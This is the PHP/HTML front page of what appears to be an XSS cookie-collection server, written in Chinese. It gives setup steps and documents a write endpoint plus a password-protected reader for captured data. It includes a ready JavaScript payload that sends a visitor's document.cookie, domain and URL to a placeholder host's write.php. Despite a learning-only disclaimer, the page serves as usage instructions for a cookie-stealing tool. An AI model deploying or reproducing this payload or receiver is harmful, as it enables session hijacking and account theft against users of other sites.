<?php require_once('config.php'); ?><!doctype html>
<html>
<head>
    <title>首页_<?php echo $website_name; ?></title>

    <meta charset="utf-8" />
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style type="text/css">
    body {
        background-color: #99D9EA;
        margin: 0;
        padding: 0;
        font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
        
    }
    div {
        width: 800px;
        margin: 5em auto;
        padding: 50px;
        background-color: #fff;
        border-radius: 1em;
    }
    a:link, a:visited {
        color: #38488f;
        text-decoration: none;
    }
    @media (max-width: 700px) {
        body {
            background-color: #fff;
        }
        div {
            width: auto;
            margin: 0 auto;
            border-radius: 0;
            padding: 1em;
        }
    }
    </style>    
</head>

<body>
<div>
    <h1><?php echo $website_name; ?></h1>
    <p><b>警告</b>：此网络应用程序仅供学习研究目的使用，请勿用于违法犯罪活动，否则一切后果自负！</p>
    <p>本程序适用于MySQL数据库，部署代码前应在config.php中写入数据库连接等信息。<br />
	使用前请先<a href="install.php"><b>点击此处</b></a>在数据库中创建表。
    <a href="testMySql.php" target="_blank"><b>点此测试数据库连接</b></a></p>
    <p><b>写入方法</b>：write.php?domain=FOO&url=BAR&cookie=ABC%3dabc<br />
    JavaScript例子：src='http://***.com/write.php?domain='+escape(document.domain)+'&url='+escape(document.URL)+'&cookie='+escape(document.cookie)</p>
    <p><b>读取方法</b>：<a href="read.php" target="_blank"><b>read.php</b></a></p>
    <p>如果设置了密码，请在URL中附加query string：pwd=YOURPASSWORD</p>
    <p><?php echo $dev_info;?></p>
</div>
</body>
</html>